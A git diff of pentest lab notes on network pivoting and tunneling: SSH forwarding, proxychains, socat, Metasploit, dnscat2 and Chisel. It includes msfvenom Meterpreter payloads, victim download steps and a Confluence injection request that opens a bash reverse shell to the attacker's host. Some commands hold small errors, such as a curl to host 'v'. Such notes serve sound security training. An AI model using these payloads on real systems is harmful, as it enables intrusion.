@@ -32,11 +32,9 @@ Check for additional NICs:
 ifconfig
 ```
 
-
 ```powershell-session
 ipconfig
 ```
-
 
 Check out the routing table:
 
@@ -46,30 +44,23 @@ netstat -r
 ip route
 ```
 
+## SSH
 
-## Port forwarding
+### Port forwarding
 
-`Port forwarding` is a technique that allows us to redirect a communication request from one port to another. Port forwarding uses TCP as the primary communication layer to provide interactive communication for the forwarded port. However, different application layer protocols such as SSH or even [SOCKS](https://en.wikipedia.org/wiki/SOCKS) (non-application layer) can be used to encapsulate the forwarded traffic.
 
-### Local port forwarding 
-
-Example:
+| NIC | Attacker machine: kali | Attacked machine 2: Windows<br>MS01 | Attacked machine 3: Linux<br>LINUX01 |
+| --- | ---------------------- | ----------------------------------- | ------------------------------------ |
+| 1   | 10.10.15.9/24          | 10.129.32.62/24                     |                                      |
+| 2   |                        | 172.16.1.5/24                       | 172.16.1.15/24                       |
+Logs you into MS01 (10.129.32.62). Sets up a port forwarding tunnel from your Kali machine (localhost:9999) to 172.16.1.15:22 via MS01. - The `-L` option sets up forwarding for traffic through `MS01`. Since `MS01` has direct access to `LINUX01`, it transparently forwards the connection.
 
 ```
-# Three hosts:
-# Attacking Kali with ip 10.10.15.90
-# Pivot host MS01 with one IP 10.129.32.62 and another IP 172.16.1.5
-# Target host LINUX01 with IP 172.16.1.15
-# Kali can connect to MS01. And MS01 can connect to LINUX01.
-# We will do a ssh port forwarding to access LINUX01 from kali:
-
+# ssh port forwarding to access LINUX01 from kali:
 ssh $MS01username@10.129.32.62 -L 9999:172.16.1.15:22 
-
-# Logs you into MS01 (10.129.32.62). Sets up a port forwarding tunnel from your Kali machine (localhost:9999) to 172.16.1.15:22 via MS01. - The `-L` option sets up forwarding for traffic through `MS01`. Since `MS01` has direct access to `LINUX01`, it transparently forwards the connection.
 ```
 
-
-Anothe  example. We will use this tunneling as a way to access locally to a remote postgresql service: 
+Another  example. We will use this tunneling as a way to access locally to a remote postgresql service: 
 
 **1.** In the attacking machine:
 
@@ -93,20 +84,6 @@ psql -U christine -h localhost -p 1234
 ```
 
 
-**3.** Confirming Port Forward with Netstat
-
-```shell-session
-netstat -antp | grep 1234
-```
-
-
-**4.** Confirming Port Forward with Nmap
-
-```shell-session
-nmap -v -sV -p1234 localhost
-```
-
-
 **Forward multiple ports**
 
 ```shell-session
@@ -114,34 +91,11 @@ ssh -L 1234:localhost:3306 -L 8080:localhost:80 usernameVictim@VictimKnownIp
 ```
 
 
-#### metasploit with proxychains
+### Dynamic port forwarding 
 
-```
-# Modify the proxychains configuration file located at `/etc/proxychains.conf` or  `/etc/proxychains4.conf`. 
-sudo nano /etc/proxychains4.conf
+Dynamic port forwarding uses a single local port and dynamically assigns remote ports for each connection.
 
-# Add `socks4 127.0.0.1 1234` to the last line  if it is not already there. 
-# Ensure that strict_chain is not commented out;
-# Dynamic_chain and random_chain should be commented out)
-# At the very bottom of the file, under ProxyList, we specify the socks5 (or socks4 ) host and port that we used for our tunnel
-
-# Check out /etc/proxychains4.conf
-tail -4 /etc/proxychains4.conf
-```
-
-Now, run metasploit:
-
-```shell-session
-proxychains msfconsole
-```
-
-### Dynamic Port Forwarding
-
-Unlike local port forwarding and remote port forwarding, which use a specific local and remote port (earlier we used 1234 and 5432, for instance), dynamic port forwarding uses a single local port and dynamically assigns remote ports for each connection.
-
-#### SSH for port forwarding
-
-**1.** **SSH command with the -D option**: To use dynamic port forwarding with SSH, you can use the ssh command with the -D option, followed by the local port, the remote host and port, and the remote SSH server. 
+**SSH command with the -D option**: To use dynamic port forwarding with SSH, you can use the ssh command with the -D option, followed by the local port, the remote host and port, and the remote SSH server. 
 
 ```bash
 ssh UserNameInVictimMachine@VictimKnownIp -D 1234
@@ -164,7 +118,7 @@ sudo nano /etc/proxychains4.conf
 tail -4 /etc/proxychains4.conf
 ```
 
-##### Ping sweep: nmaps with proxychains
+##### nmaps +  proxychains
 
 Once you complete the previous steps 1 and 2, you can use nmap with proxychains:
 
@@ -176,57 +130,7 @@ proxychains nmap -v -Pn -sT $NewDiscoveredIp
 	One more important note to remember here is that we can only perform a `full TCP connect scan` over proxychains. The reason for this is that proxychains cannot understand partial packets.
 
 
-##### Ping Sweep For Loop on Linux Pivot Hosts
-
-```
-ssh UserNameInVictimMachine@VictimKnownIp  
-```
-
-```shell-session
-for i in {1..254} ;do (ping -c 1 172.16.139.$i | grep "bytes from" &) ;done
-```
-
-Another way:
-
-```bash
-for i in $(seq 1 254); do host 172.16.5.$i; done | grep -v "not found"
-```
-
-##### Ping Sweep Using PowerShell
-
-
-```
-ssh UserNameInVictimMachine@VictimKnownIp  
-```
-
-```powershell-session
-1..254 | % {"172.16.9.$($_): $(Test-Connection -count 1 -comp 172.16.9.$($_) -quiet)"}
-
-1..254 | % {"172.16.6.$($_): $(Test-Connection -count 1 -comp 172.16.6.$($_) -quiet)"}
-
-
-1..100 | % {"172.16.9.$($_): $(Test-Connection -count 1 -comp 172.16.9.$($_) -quiet)"}
-```
-
-Scanning ports in Powershell:
-
-```powershell
-foreach ($ports in 1..1024) {If (($a=Test-NetConnection 10.10.12.123 -Port $port -WarningAction SilentlyContinue).tcpTestSucceeded -eq $true){ "TCP port $port is open}}
-```
-
-
-##### Ping Sweep For Loop Using CMD
-
-
-```
-ssh UserNameInVictimMachine@VictimKnownIp  
-```
-
-```cmd-session
-for /L %i in (1 1 254) do ping 172.16.6.%i -n 1 -w 100 | find "Reply"
-```
-
-##### RDP with proxychains
+##### RDP +  proxychains
 
 With proxychains you can use more services. For instance, xfreerdp:
 
@@ -253,9 +157,397 @@ We have found $NewDiscoveredIp with open port 3389. We know the creds. So, with 
 proxychains xfreerdp /v:$NewDiscoveredIp /u:$username /p:$password
 ```
 
+#### Metasploit +  proxychains
+
+```
+# Modify the proxychains configuration file located at `/etc/proxychains.conf` or  `/etc/proxychains4.conf`. 
+sudo nano /etc/proxychains4.conf
+
+# Add `socks4 127.0.0.1 1234` to the last line  if it is not already there. 
+# Ensure that strict_chain is not commented out;
+# Dynamic_chain and random_chain should be commented out)
+# At the very bottom of the file, under ProxyList, we specify the socks5 (or socks4 ) host and port that we used for our tunnel
+
+# Check out /etc/proxychains4.conf
+tail -4 /etc/proxychains4.conf
+```
+
+Now, run metasploit:
+
+```shell-session
+proxychains msfconsole
+```
 
 
-#### Module `portfwd` in metasploit
+### SSH Reverse Port Forwarding
+
+| NIC | Attacker machine: kali | Attacked machine 1: ubuntu <br>META | Attacked machine 2:  Windows<br>META2 |
+| --- | ---------------------- | ----------------------------------- | ------------------------------------- |
+| 1   | 192.64.166.2/24        | 192.64.166.3/24                     |                                       |
+| 2   |                        | 192.182.147.2/24                    | 192.182.147.3/24                      |
+
+
+![lateral-movement.png](img/lateral-movement.png)
+
+
+**Goal**: From the kali we will make a RDP connection with Meta_2, the windows machine. 
+
+For that we will use the Victim's machine 1 as a reverse port forwarding. 
+
+```shell-session
+# Syntax
+ssh -R ipMETA:8080:0.0.0.0:8000 ubuntu@ipMETA2 -vN
+
+# Translated to our case:
+ssh -R 192.182.147.2:8080:0.0.0.0:8000 ubuntu@192.64.166.3 -vN
+# We are using port 8080 on the Ubuntu server to forward all of our reverse packets to our attack hosts' 8000 port
+```
+
+**Obtain a reverse shell**
+
+Now we need to create a payload that is going to be triggered in the Victim's machine 2 (the windows one).  First we create it in our kali:
+
+```shell-session
+msfvenom -p windows/x64/meterpreter/reverse_https lhost=192.182.147.2 -f exe -o backupscript.exe LPORT=8080
+```
+
+Now we move this malicious file to the victim's machine 2:
+
+```
+# First we copy it to the Ubuntu machine from our Kali
+ scp backupscript.exe ubuntu@192.64.166.3:~/
+
+# Then we connect to the Ubuntu machine
+ssh ubuntu@192.64.166.3
+# And make the file executable
+chmod +x backupjob
+# And there we start a http server to serve the copied file to the windows machine:
+python3 -m http.server 8123
+
+# We have access to the windows machine, so we download the malicious file via web browser or even this command:
+Invoke-WebRequest -Uri "http://192.64.166.3:8123/backupscript.exe" -OutFile "C:\backupscript.exe"
+```
+
+Now, we start a listener in our kali:
+
+```
+msfconsole -q
+use exploit/multi/handler
+set payload windows/x64/meterpreter/reverse_https
+set lhost 0.0.0.0
+set lport 8000
+run
+```
+
+Now we  execute the payload from the Windows target.
+
+We will receive the reverse shell.
+
+**Module `portfwd` in metasploit**
+
+Reverse  port forwarding can also be accomplished using Meterpreter's `portfwd` module,  where you might want to listen on a specific port on the compromised server and forward all incoming shells from the Ubuntu server to our attack host.
+
+We will start a listener on a new port on our attack host for Windows and request the Ubuntu server to forward all requests received to the Ubuntu server on port `1234` to our listener on port `8081`.
+
+```shell-session
+meterpreter > portfwd add -R -l 8081 -p 1234 -L 192.64.166.3
+```
+
+**1.** Configuring & Starting multi/handler
+
+```shell-session
+meterpreter > set payload windows/x64/meterpreter/reverse_tcp
+set LPORT 8081 
+set LHOST 0.0.0.0 
+run
+```
+
+We can now create a reverse shell payload that will send a connection back to our Ubuntu server on `192.182.147.2`:`1234` when executed on our Windows host. Once our Ubuntu server receives this connection, it will forward that to `attack host's ip`:`8081` that we configured.
+
+```shell-session
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.182.147.2 -f exe -o backupscript.exe LPORT=1234
+```
+
+Finally, if we execute our payload on the Windows host, we should be able to receive a shell from Windows pivoted via the Ubuntu server.
+
+```shell-session
+# #### Establishing the Meterpreter session
+[*] Started reverse TCP handler on 0.0.0.0:8081 
+[*] Sending stage (200262 bytes) to 192.64.166.3
+[*] Meterpreter session 2 opened (192.64.166.3:8081 -> 192.64.166.3:40173 ) at 2022-03-04 15:26:14 -0500
+
+ 
+meterpreter > shell
+```
+
+### SSH Double pivoting - Port Fordward
+
+
+| NIC | Attacker machine: kali | Attacked machine 1: ubuntu<br>CONFLUENCE01 | Attacked machine 2: Windows<br>PGDATABASE01 | Attacked machine 3: Windows |
+| --- | ---------------------- | ------------------------------------------ | ------------------------------------------- | --------------------------- |
+| 1   | 192.168.45.187/23      | 192.168.187.63/23                          |                                             |                             |
+| 2   |                        | 10.4.187.63/24                             | 10.4.187.215/24                             |                             |
+| 3   |                        |                                            | 172.16.187.110/24                           | 172.16.187.217/24           |
+
+
+![[double.png]]
+
+From kali we achieve a reverse shell on Confluence01.
+
+We also know the ssh user database_admin of PGDATABASE01, our pivoted machine number 2.
+
+And now in the terminal of our first pivot Confluence01, we establish the following tunnel:
+
+```bash
+ssh -N -L 0.0.0.0:4455:172.16.187.217:445 database_admin@10.4.187.215
+```
+
+And now, from kali we can access the last service 172.16.187.217 using the tunnel that we set in port 4455 (assuming that we also know the password for that share):
+
+```
+smbclient -p 4455 -L //192.168.187.63/ -U hr_admin --password=Welcome1234
+```
+
+And browse the share:
+
+```
+smbclient -p 4455 //192.168.187.63/Scripts -U hr_admin --password=Welcome1234
+```
+
+### SSH Double pivoting - Dynamic Port Fordwarding
+
+
+| NIC | Attacker machine: kali | Attacked machine 2: ubuntu<br>CONFLUENCE01 | Attacked machine 3: Windows<br>PGDATABASE01 | Attacked machine 5: Windows<br>HRSHARES |
+| --- | ---------------------- | ------------------------------------------ | ------------------------------------------- | --------------------------------------- |
+| 1   | 192.168.45.187/23      | 192.168.213.63/23                          |                                             |                                         |
+| 2   |                        | 10.4.213.215/24                            | 10.4.213.217/24                             |                                         |
+| 3   |                        |                                            | 172.16.213.217/24                           | 172.16.213.221/24                       |
+
+
+
+![[ssh-dinamic.png]]
+
+
+From kali we achieve a reverse shell on Confluence01.
+
+We also know the ssh user database_admin of PGDATABASE01, our pivoted machine number 2.
+
+And now in the terminal of our first pivot Confluence01, we establish the following tunnel:
+
+```bash
+ssh -N -D 0.0.0.0:9999 database_admin@10.4.213.215
+```
+
+And now, from kali we can access the last service 172.16.213.217 using the tunnel that we set and enumerate all services in other internal IPs. But we need to enable proxychains.
+
+So in kali:
+
+```bash
+tail /etc/proxychains4.conf
+```
+
+It should display:
+
+```text
+#       proxy types: http, socks4, socks5, raw
+#         * raw: The traffic is simply forwarded to the proxy without modification.
+#        ( auth types supported: "basic"-http  "user/pass"-socks )
+#
+[ProxyList]
+# add proxy here ...
+# meanwile
+# defaults set to "tor"
+socks5 192.168.213.63 9999
+```
+
+With Proxychains properly configured, we can use smbclient from our Kali machine to enumerate available shares on HRSHARES. Rather than connecting to the port on CONFLUENCE01, we'll write the smbclient command as though we have a direct connection to PGDATABASE01.
+
+```bash
+proxychains smbclient -L //172.16.213.217/ -U hr_admin --password=Welcome1234
+```
+
+We may also use nmap and other services from kali.
+
+```bash
+sudo proxychains nmap -vvv -sT -p4870-4900 -Pn 172.16.213.217
+```
+
+
+### SSH Remote Port Forwarding
+
+
+| NIC | Attacker machine: kali | Attacked machine 2: ubuntu<br>CONFLUENCE01 | Attacked machine 3: Windows<br>PGDATABASE01 | Attacked machine 4: Windows<br>HRSHARES |
+| --- | ---------------------- | ------------------------------------------ | ------------------------------------------- | --------------------------------------- |
+| 1   | 192.168.45.187/23      | 192.168.213.63/23                          |                                             |                                         |
+| 2   |                        | 10.4.213.63/24                             | 10.4.213.215/24                             |                                         |
+| 3   |                        |                                            | 172.16.213.215/24                           | 172.16.213.217/24                       |
+
+
+![[ssh-reverse.png]]
+
+The explanation: Outbound connections are more difficult to control than inbound connections. Most corporate networks will restrict inbound traffic but they will allow many types of common network traffic out (including SSH!). This is where SSH [_remote port forwarding_](https://man.openbsd.org/ssh#R) can be extremely useful.
+
+> We can think of it like a reverse shell, but for port forwarding. While in local and dynamic port forwarding, the listening port is bound to the SSH client, in remote port forwarding, the listening port is bound to the SSH server. Instead of the packet forwarding being done by the SSH server, in remote port forwarding, packets are forwarded by the SSH client.
+
+Start a Kali SSH server:
+
+```
+# Initiate the service
+sudo systemctl start ssh
+
+# Check that the SSH port is open as we expected using ss.
+sudo ss -ntplu
+
+# Review the ssh service at: /etc/ssh/sshd_config. Configure user and password. To connect back to the Kali SSH server using a username and password you may have to explicity allow password-based authentication by setting PasswordAuthentication to yes in /etc/ssh/sshd_config.
+```
+
+Initiate the reverse shell we had in Confluence01.
+
+```
+# Listener in kali
+nc -lnvp 4444
+
+# Trigger the vulnerability in another terminal to gain the reverse shell in the listener
+curl http://v:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27bash%20-i%20%3E%26%20/dev/tcp/192.168.45.187/4444%200%3E%261%27%29.start%28%29%22%29%7D/
+
+# Spawn a shell in the reverse shell
+python3 -c 'import pty; pty.spawn("/bin/sh")'
+```
+
+And now:
+
+```bash
+ssh -N -R 127.0.0.1:2345:10.4.213.215:5432 kali@192.168.45.187
+```
+
+With the port forward active, we can now query port 2345 on the Kali loopback interface as though interacting directly with the PostgreSQL service on PGDATABASE01. From kali:
+
+```bash
+psql -h 127.0.0.1 -p 2345 -U postgres
+```
+
+It will be redirected to the 10.4.213.215:5432
+
+### SSH Remote Dynamic Port Forwarding
+
+With remote port forwarding, we were able to forward packets to one socket per SSH connection. However, just as we found with local port forwarding, this single-socket-per-connection limitation can slow us down. Remote dynamic port forwarding creates a _dynamic port forward_ in the _remote_ configuration.
+
+| NIC | Attacker machine: kali | Attacked machine 2: ubuntu<br>CONFLUENCE01 | Attacked machine 3: Windows<br>MULTISERVER03<br> | Attacked machine 4: Windows<br>PGDATABASE01 | Attacked machine 5: Windows<br>HRSHARES |
+| --- | ---------------------- | ------------------------------------------ | ------------------------------------------------ | ------------------------------------------- | --------------------------------------- |
+| 1   | 192.168.45.187/23      | 192.168.213.63/23                          |                                                  |                                             |                                         |
+| 2   |                        | 10.4.213.63/24                             | 10.4.213.64/24                                   | 10.4.213.215/24                             |                                         |
+| 3   |                        |                                            |                                                  | 172.16.213.215/24                           | 172.16.213.217/24                       |
+
+
+
+![[ssh-dinamic-forwarding2.png]]
+
+Remote dynamic port forwarding has only been available since October 2017's [OpenSSH 7.6](https://www.openssh.com/txt/release-7.6).
+
+> The remote dynamic port forwarding command is relatively simple, although (slightly confusingly) it uses the same **-R** option as classic remote port forwarding. The difference is that when we want to create a remote dynamic port forward, we pass only one socket: the socket we want to listen on the SSH server. We don't even need to specify an IP address; if we just pass a port, it will be bound to the loopback interface of the SSH server by default.
+
+
+Start a Kali SSH server:
+
+```
+# Initiate the service
+sudo systemctl start ssh
+
+# Check that the SSH port is open as we expected using ss.
+sudo ss -ntplu
+
+# Review the ssh service at: /etc/ssh/sshd_config. Configure user and password. To connect back to the Kali SSH server using a username and password you may have to explicity allow password-based authentication by setting PasswordAuthentication to yes in /etc/ssh/sshd_config.
+```
+
+Initiate the reverse shell we had in Confluence01.
+
+```
+# Listener in kali
+nc -lnvp 4444
+
+# Trigger the vulnerability in another terminal to gain the reverse shell in the listener
+curl http://192.168.213.63:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27bash%20-i%20%3E%26%20/dev/tcp/192.168.45.187/4444%200%3E%261%27%29.start%28%29%22%29%7D/
+
+# Spawn a shell in the reverse shell
+python3 -c 'import pty; pty.spawn("/bin/sh")'
+```
+
+And now:
+
+```bash
+ssh -N -R 9998 kali@192.168.45.187
+```
+
+Back on our Kali machine, we can check that port 9998 is bound by using ss.
+
+```bash
+sudo ss -ntplu
+```
+
+The SOCKS proxy port has been bound on both the IPv4 and IPv6 loopback interfaces on our Kali machine.
+
+We'll edit our Proxychains configuration file at **/etc/proxychains4.conf** on our Kali machine to reflect our new local SOCKS proxy port.
+
+```bash
+tail /etc/proxychains4.conf
+```
+
+containing:
+
+```text
+#       proxy types: http, socks4, socks5, raw
+#         * raw: The traffic is simply forwarded to the proxy without modification.
+#        ( auth types supported: "basic"-http  "user/pass"-socks )
+#
+[ProxyList]
+# add proxy here ...
+# meanwile
+# defaults set to "tor"
+socks5 127.0.0.1 9998
+```
+
+Now we can:
+
+```
+proxychains nmap -vvv -sT --top-ports=20 -Pn -n 10.4.213.64
+```
+
+
+## SSH Pivoting with Sshuttle
+
+| NIC | Attacker machine: kali | Attacked machine 2: ubuntu | Attacked machine 3: Windows |
+| --- | ---------------------- | -------------------------- | --------------------------- |
+| 1   | 10.10.10.2/24          | 10.10.10.3/24              |                             |
+| 2   |                        | 10.10.20.2/24              | 10.10.20.3/24               |
+
+
+Sshuttle is another tool written in Python which removes the need to configure proxychains. However, this tool only works for pivoting over SSH and does not provide other options for pivoting over TOR or HTTPS proxy servers.
+
+`Sshuttle` can be extremely useful for automating the execution of iptables and adding pivot rules for the remote host. We can configure the Ubuntu server as a pivot point and route all of Nmap's network traffic with sshuttle:
+
+**1.** Installing sshuttle
+
+```shell-session
+sudo apt-get install sshuttle
+```
+
+**2.** Running sshuttle
+
+```shell-session
+sudo sshuttle -r ubuntu@10.10.10.3 10.10.20.0/24 -v 
+# With this command, sshuttle creates an entry in our iptables to redirect all traffic to the 172.16.5.0/23 network through the pivot host.
+```
+
+**3.** We can now use any tool directly without using proxychains.
+
+```shell-session
+nmap -v -sV -p3389 10.10.20.3 -A -Pn
+```
+
+
+## Metasploit
+
+### Module `portfwd` in metasploit
 
 Port forwarding can also be accomplished using Meterpreter's `portfwd` module. We can enable a listener on our attack host and request Meterpreter to forward all the packets received on this port via our Meterpreter session to a remote host on the 172.16.5.0/23 network
 
@@ -312,8 +604,7 @@ netstat -antp
 ```
 
 
-
-#### Module `ping_sweep` in metasploit
+### Module `ping_sweep` in metasploit
 
 Module ping_sweep in metasploit allows us to perform a ping sweep from our meterpreter session to the new discovered subnet (reachable only from that session). 
 
@@ -358,7 +649,7 @@ meterpreter > run post/multi/gather/ping_sweep RHOSTS=$newDiscoveredIPrange/23
 [*] Performing ping sweep for IP range $newDiscoveredIPrange/23
 ```
 
-#### Module `Autoroute` in metasploit
+### Module `Autoroute` in metasploit
 
 Autoroute module allows you to set routes from a meterpreter session to a discovered subnet in the attacked machine. It allow us pivoting from one subnet to another.
 
@@ -449,152 +740,57 @@ proxychains nmap $NewDiscoveredIp -p3389 -sT -v -Pn
 ```
 
 
-### Reverse Port Forwarding
-
-For better understanding, we will have the following machines:
-
-- Attacker machine: Kali, with IP 192.64.166.2
-- 0.Victim's machine 1: Meta_3, a ubuntu machine with 2 networks interfaces: 192.64.166.3 and 192.182.147.2
-- Victim's machine 2: Meta_2, a windows machine with nic 192.182.147.3
-
-![lateral-movement.png](img/lateral-movement.png)
-
- 
-#### SSH Reverse Port Forwarding
-
-**Goal**: From the kali we will make a RDP connection with Meta_2, the windows machine. 
-
-For that we will use the Victim's machine 1 as a reverse port forwarding. 
-
-```shell-session
-# Syntax
-ssh -R <InternalIPofPivotHost>:8080:0.0.0.0:8000 ubuntu@<ipAddressofTarget> -vN
-
-# Translated to our case:
-ssh -R 192.182.147.2:8080:0.0.0.0:8000 ubuntu@192.64.166.3 -vN
-# We are using port 8080 on the Ubuntu server to forward all of our reverse packets to our attack hosts' 8000 port
-```
-
-##### Obtain a reverse shell
-
-Now we need to create a payload that is going to be triggered in the Victim's machine 2 (the windows one).  First we create it in our kali:
-
-```shell-session
-msfvenom -p windows/x64/meterpreter/reverse_https lhost=192.182.147.2 -f exe -o backupscript.exe LPORT=8080
-```
-
-Now we move this malicious file to the victim's machine 2:
-
-```
-# First we copy it to the Ubuntu machine from our Kali
- scp backupscript.exe ubuntu@192.64.166.3:~/
-
-# Then we connect to the Ubuntu machine
-ssh ubuntu@192.64.166.3
-# And make the file executable
-chmod +x backupjob
-# And there we start a http server to serve the copied file to the windows machine:
-python3 -m http.server 8123
-
-# We have access to the windows machine, so we download the malicious file via web browser or even this command:
-Invoke-WebRequest -Uri "http://192.64.166.3:8123/backupscript.exe" -OutFile "C:\backupscript.exe"
-```
-
-Now, we start a listener in our kali:
-
-```
-msfconsole -q
-use exploit/multi/handler
-set payload windows/x64/meterpreter/reverse_https
-set lhost 0.0.0.0
-set lport 8000
-run
-```
-
-Now we  execute the payload from the Windows target.
-
-We will receive the reverse shell.
-
-#### Module `portfwd` in metasploit
-
-Reverse  port forwarding can also be accomplished using Meterpreter's `portfwd` module,  where you might want to listen on a specific port on the compromised server and forward all incoming shells from the Ubuntu server to our attack host.
-
-We will start a listener on a new port on our attack host for Windows and request the Ubuntu server to forward all requests received to the Ubuntu server on port `1234` to our listener on port `8081`.
-
-```shell-session
-meterpreter > portfwd add -R -l 8081 -p 1234 -L 192.64.166.3
-```
-
-**1.** Configuring & Starting multi/handler
-
-```shell-session
-meterpreter > set payload windows/x64/meterpreter/reverse_tcp
-set LPORT 8081 
-set LHOST 0.0.0.0 
-run
-```
-
-We can now create a reverse shell payload that will send a connection back to our Ubuntu server on `192.182.147.2`:`1234` when executed on our Windows host. Once our Ubuntu server receives this connection, it will forward that to `attack host's ip`:`8081` that we configured.
-
-```shell-session
-msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.182.147.2 -f exe -o backupscript.exe LPORT=1234
-```
-
-Finally, if we execute our payload on the Windows host, we should be able to receive a shell from Windows pivoted via the Ubuntu server.
-
-```shell-session
-# #### Establishing the Meterpreter session
-[*] Started reverse TCP handler on 0.0.0.0:8081 
-[*] Sending stage (200262 bytes) to 192.64.166.3
-[*] Meterpreter session 2 opened (192.64.166.3:8081 -> 192.64.166.3:40173 ) at 2022-03-04 15:26:14 -0500
-
- 
-meterpreter > shell
-```
 
 ## Socat 
 
-### Socat Redirection with a Reverse Shell
+### Port forwarding: gaining a Reverse Shell
 
-[Socat](https://linux.die.net/man/1/socat) is a bidirectional relay tool that can create pipe sockets between `2` independent network channels without needing to use SSH tunneling.
+[Socat](https://linux.die.net/man/1/socat) is a bidirectional relay tool that can create pipe sockets between `2` independent network channels without needing to use SSH tunneling.  It acts as a redirector that can listen on one host and port and forward that data to another IP address and port.
 
-It acts as a redirector that can listen on one host and port and forward that data to another IP address and port.
+![[socat_01.png]]
 
-Starting Socat Listener in our attacker machine:
+From the CONFLUENCE01 pivoting machine:
 
-```shell-session
-# Socat will listen on localhost on port 8080 and forward all the traffic to port 80 on our attack host (192.64.166.3).
-socat TCP4-LISTEN:8080,fork TCP4:192.64.166.3:80
-# the fork option tells socat to create a new child process for each incoming connection.
+```bash
+socat -ddd TCP-LISTEN:2345,fork TCP:10.4.50.215:5432
 ```
 
-Configuring & Starting the multi/handler. Starting a listener on our attacked host:
+where: 
 
-```shell-session
-sudo msfconsole
-use exploit/multi/handler
-set payload windows/x64/meterpreter/reverse_https
-set lhost 0.0.0.0
-set lport 80
-run
+```text
+Confluence01 is the pivoting target
+With -ddd we start a verbose socat process that will listen on TCP 2345 in CONFLUENCE01. It will for into a new subprocess when it receives a connection and forward all traffic to TCP port 5432 on PGDATABASE01 (**TCP:10.4.50.215:5432**).
+
 ```
 
-Create a windows payload
+Now we **CANNOT run nmap** from our kali attacking machine commands on the second network interface in Confluence01 to  enumerate services in PGDATABASE01:
 
-```shell-session
-msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.64.147.2 -f exe -o backupscript.exe LPORT=8080
+```bash
+nmap 10.4.50.215
 ```
 
-Keep in mind that we must transfer this payload to the Windows host (192.182.147.3) and execute it to obtain the reverse shell.
+BUT we can connect to that network interface by tunneling the communication via the socat:
 
-### Socat Redirection with a Bind Shell
+```
+psql -h 192.168.187.63 -p 2345 -U postgres
+```
 
+Note the IP is the pivoting machine, and the target port used for tunneling.
+
+
+
+### Port forwarding: : gaining a Bind Shell
+
+
+```text
 Attacker machine: 192.64.166.2
 Attacked machine 1: 
 	- 192.64.166.3: A listener in port 8080 that forwards all from 192.182.147.3:8443
 	- 192.182.147.2: 
 Attacked machine 2:
 	- 192.182.147.3:  A listener in port 8443
+
+```
 
 
 **1.** Create a bind shell with the windows payload using msfvenom from our attacker machine:
@@ -650,38 +846,6 @@ plink -ssh -D 9050 ubuntu@10.10.10.3
 Another Windows-based tool called [Proxifier](https://www.proxifier.com/) can be used to start a SOCKS tunnel via the SSH session we created. Proxifier is a Windows tool that creates a tunneled network for desktop client applications and allows it to operate through a SOCKS or HTTPS proxy and allows for proxy chaining. It is possible to create a profile where we can provide the configuration for our SOCKS server started by Plink on port 9050.
 
 After configuring the SOCKS server for `127.0.0.1` and port 9050, we can directly start `mstsc.exe` to start an RDP session with a Windows target that allows RDP connections.
-
-## SSH Pivoting with Sshuttle
-
-| NIC | Attacker machine: kali | Attacked machine 2: ubuntu | Attacked machine 3: Windows |
-| --- | ---------------------- | -------------------------- | --------------------------- |
-| 1   | 10.10.10.2/24          | 10.10.10.3/24              |                             |
-| 2   |                        | 10.10.20.2/24              | 10.10.20.3/24               |
-
-
-Sshuttle is another tool written in Python which removes the need to configure proxychains. However, this tool only works for pivoting over SSH and does not provide other options for pivoting over TOR or HTTPS proxy servers.
-
-`Sshuttle` can be extremely useful for automating the execution of iptables and adding pivot rules for the remote host. We can configure the Ubuntu server as a pivot point and route all of Nmap's network traffic with sshuttle:
-
-**1.** Installing sshuttle
-
-```shell-session
-sudo apt-get install sshuttle
-```
-
-**2.** Running sshuttle
-
-```shell-session
-sudo sshuttle -r ubuntu@10.10.10.3 10.10.20.0/24 -v 
-# With this command, sshuttle creates an entry in our iptables to redirect all traffic to the 172.16.5.0/23 network through the pivot host.
-```
-
-**3.** We can now use any tool directly without using proxychains.
-
-```shell-session
-nmap -v -sV -p3389 10.10.20.3 -A -Pn
-```
-
 
 ## Web Server Pivoting with Rpivot
 
@@ -788,9 +952,8 @@ xfreerdp /v:$IpInterface1:8080 /u:$username /p:$password
 ```
 
 
-## Tunneling
 
-### DNS tunneling with Dnscat2 
+## DNS tunneling with Dnscat2 
 
 [Dnscat2](https://github.com/iagox86/dnscat2) is a tunneling tool that uses DNS protocol to send data between two hosts. It uses an encrypted `Command-&-Control` (`C&C` or `C2`) channel and sends data inside TXT records within the DNS protocol.
 
@@ -907,13 +1070,78 @@ window -i 1
 ```
 
 
-### SOCKS5 Tunneling with Chisel
+## Chisel
 
-#### Chisel pivot
+### Chisel pivot
 
 [Chisel](https://github.com/jpillora/chisel) is a TCP/UDP-based tunneling tool written in [Go](https://go.dev/) that uses HTTP to transport data that is secured using SSH. `Chisel` can create a client-server tunnel connection in a firewall restricted environment. 
 
-This can allow us to pivot from a reachable network segment to a different network segment. For that, we will use the compromised machine (Ubuntu) as our Chisel server, listing on port 1234:
+This can allow us to pivot from a reachable network segment to a different network segment. **The traffic between the Chisel client and server is all HTTP-formatted. This means we can traverse the deep packet inspection solution regardless of the contents of each HTTP packet**. 
+
+#### Scenario #1 from Offsec
+
+| NIC | Attacker machine: kali | Compromised machine 1: ubuntu <br>CONFLUENCE01 | Attacked machine 2:  Windows<br>PGDATABASE01 |
+| --- | ---------------------- | ---------------------------------------------- | -------------------------------------------- |
+| 1   | 192.168.45.231/23      | 192.168.227.63/23                              |                                              |
+| 2   |                        | 10.4.227.63/24                                 | 10.4.227.215/24                              |
+
+Check [chisel releases](https://github.com/jpillora/chisel/releases) to get the appropriate version (go version and chisel one):
+
+```bash
+chisel -h
+
+# For instance... grabbing the 1.8.1
+wget https://github.com/jpillora/chisel/releases/download/v1.8.1/chisel_1.8.1_linux_amd64.gz
+gunzip chisel_1.8.1_linux_amd64.gz
+```
+
+Serve from kali the chisel client to the compromised pivoting machine 1 CONFLUENCE01:
+
+```bash
+python -m http.server 80
+```
+
+Trigger the CVE vulnerability from CONFLUENCE01 to achieve the reverse shell:
+
+```bash
+
